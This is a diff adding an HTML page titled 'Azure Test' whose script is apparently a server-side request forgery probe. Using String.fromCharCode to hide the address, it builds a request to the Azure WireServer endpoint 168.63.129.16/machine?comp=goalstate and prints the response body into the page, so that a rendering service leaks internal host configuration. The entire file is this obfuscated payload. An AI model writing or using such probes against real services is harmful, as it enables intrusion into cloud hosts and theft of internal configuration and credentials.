@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>Azure Test</title></head>
+<body>
+<h1>AZURE_WIRESERVER_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+var ip = String.fromCharCode(49,54,56,46,54,51,46,49,50,57,46,49,54);
+var proto = String.fromCharCode(104,116,116,112);
+var url = proto + "://" + ip + "/machine?comp=goalstate";
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', url, false);
+  xhr.send();
+  document.getElementById('r1').innerText = 'STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0,2000);
+} catch(e) {
+  document.getElementById('r1').innerText = 'ERROR:' + e.name + ':' + e.message;
+}
+</script>
+</body>
+</html>
